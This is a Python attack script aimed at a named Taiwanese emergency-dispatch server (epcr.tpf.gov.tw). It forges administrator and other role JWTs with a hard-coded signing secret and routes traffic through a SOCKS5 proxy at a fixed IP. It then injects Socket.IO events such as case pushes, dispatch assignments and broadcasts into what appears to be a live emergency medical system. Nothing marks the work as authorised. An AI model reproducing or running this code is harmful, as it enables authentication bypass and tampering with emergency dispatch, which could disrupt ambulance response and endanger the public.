#!/usr/bin/env python3
"""
EPCR JWT Push Test v1 — emit Socket.IO events via authenticated long-polling
After CONNECT with forged JWT, try emitting events.
Socket.IO EVENT packet: 42<ackId>["eventName", ...payload...]
"""
import requests, json, time, re
import datetime
import jwt as pyjwt

PROXY_HOST = "202.160.76.157"
PROXY_PORT = 11081
JWT_SECRET = "ru/3xu4dkru4888"
SERVER = "epcr.tpf.gov.tw"
SOCKET_PORT = 4004
S = f"socks5://{PROXY_HOST}:{PROXY_PORT}"

def forge_jwt(account="admin", role="ADMIN", user_id=1):
    now = datetime.datetime.now(datetime.timezone.utc)
    return pyjwt.encode({
        "sub": str(user_id), "account": account, "role": role,
        "iat": now, "exp": now + datetime.timedelta(hours=48),
    }, JWT_SECRET, algorithm="HS256")

# 1. Handshake
sess = requests.Session()
sess.proxies = {"https": S}
sess.verify = False

resp = sess.get(
    f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
    params={"EIO": "4", "transport": "polling", "t": str(int(time.time()*1000))},
    timeout=10,
)
sid = re.search(r'"sid":"([^"]+)"', resp.text).group(1)
print(f"[1] Handshake: sid={sid}")

# 2. CONNECT with JWT
token = forge_jwt(account="admin", role="ADMIN", user_id=1)
print(f"[2] JWT forged: {token[:50]}...")

# Format: 40{"token":"<jwt>"} with correct length prefix
connect_msg = f'40{{"token":"{token}"}}'
connect_data = f"{len(connect_msg)}:{connect_msg}"

resp2 = sess.post(
    f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
    params={"EIO": "4", "transport": "polling", "sid": sid, "t": str(int(time.time()*1000))},
    data=connect_data,
    headers={"Content-Type": "text/plain;charset=utf-8"},
    timeout=10,
)
print(f"[2] CONNECT: HTTP {resp2.status_code} — {resp2.text}")

# 3. Try emitting Socket.IO events (EVENT = type 2)
# Socket.IO v4 EVENT: 42["eventName", {"payload"}]
# Engine.IO framing: <len>:42["eventName", ...]
events = [
    'case/push',
    'case/broadcast',
    'dispatch/push',
    'push/case',
    'dispatch/pushcase',
    'notify',
    'broadcast',
    'case/notify',
]

for event_name in events:
    # Socket.IO EVENT: 42["eventName", {"caseId":"test","message":"hello"}]
    payload = f'42["{event_name}", {{"caseId": "test", "message": "hello"}}]'
    framed = f'{len(payload)}:{payload}'
    
    try:
        resp = sess.post(
            f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
            params={"EIO": "4", "transport": "polling", "sid": sid, "t": str(int(time.time()*1000))},
            data=framed,
            headers={"Content-Type": "text/plain;charset=utf-8"},
            timeout=10,
        )
        status = resp.status_code
        body = resp.text[:150] if resp.text else "(empty)"
        # Only print interesting results
        if status != 200 or "ok" not in body.lower():
            print(f"  [{event_name}] HTTP {status} — {body}")
        else:
            print(f"  [{event_name}] HTTP {status} — ok ✅")
    except Exception as e:
        print(f"  [{event_name}] Error — {e}")

# 4. Try with different accounts
print("\n[4] Testing with different roles...\n")
for account, role in [("admin", "ADMIN"), ("dispatcher", "DISPATCHER"), ("emt1", "EMT"), ("ntpc119", "119")]:
    token2 = forge_jwt(account=account, role=role, user_id=1)
    connect_msg2 = f'40{{"token":"{token2}"}}'
    connect_data2 = f"{len(connect_msg2)}:{connect_msg2}"
    
    # New handshake for each
    resp_h = sess.get(
        f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
        params={"EIO": "4", "transport": "polling", "t": str(int(time.time()*1000))},
        timeout=10,
    )
    sid2 = re.search(r'"sid":"([^"]+)"', resp_h.text).group(1)
    
    resp_c = sess.post(
        f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
        params={"EIO": "4", "transport": "polling", "sid": sid2, "t": str(int(time.time()*1000))},
        data=connect_data2,
        headers={"Content-Type": "text/plain;charset=utf-8"},
        timeout=10,
    )
    print(f"  [{account}/{role}] CONNECT: HTTP {resp_c.status_code} — {resp_c.text[:100]}")

# 5. Try Socket.IO ACK events
print("\n[5] Testing ACK-style events...\n")
for event_name in ["case/push", "dispatch/pushcase", "notify"]:
    payload = f'410["{event_name}", {{"caseId": "test"}}]'  # ACK requested (id=0)
    framed = f'{len(payload)}:{payload}'
    try:
        resp = sess.post(
            f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
            params={"EIO": "4", "transport": "polling", "sid": sid, "t": str(int(time.time()*1000))},
            data=framed,
            headers={"Content-Type": "text/plain;charset=utf-8"},
            timeout=10,
        )
        print(f"  ACK [{event_name}] (id=0): HTTP {resp.status_code} — {resp.text[:150]}")
    except Exception as e:
        print(f"  ACK [{event_name}]: Error — {e}")

# 6. Try emitting via different Socket.IO packet formats
print("\n[6] Testing Socket.IO broadcast emit (namespace events)...\n")
broadcast_events = [
    ('421["case/update", {"caseId":"test","status":"dispatched"}]', "case/update"),
    ('422["dispatch/assign", {"caseId":"test","emt":"test"}]', "dispatch/assign"),
    ('423["broadcast/case", {"data":"test"}]', "broadcast/case"),
    ('424["pushcase", {"caseId":"test"}]', "pushcase"),
    ('425["dispatch", {"caseId":"test"}]', "dispatch"),
    ('426["case/pushtest", {"caseId":"test"}]', "case/pushtest"),
]

for framed_event, name in broadcast_events:
    try:
        resp = sess.post(
            f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
            params={"EIO": "4", "transport": "polling", "sid": sid, "t": str(int(time.time()*1000))},
            data=f'{len(framed_event)}:{framed_event}',
            headers={"Content-Type": "text/plain;charset=utf-8"},
            timeout=10,
        )
        body = resp.text[:150] if resp.text else "(empty)"
        if resp.status_code != 200:
            print(f"  [{name}] HTTP {resp.status_code} — {body}")
    except Exception as e:
        print(f"  [{name}] Error — {e}")

print("\n=== Done ===")
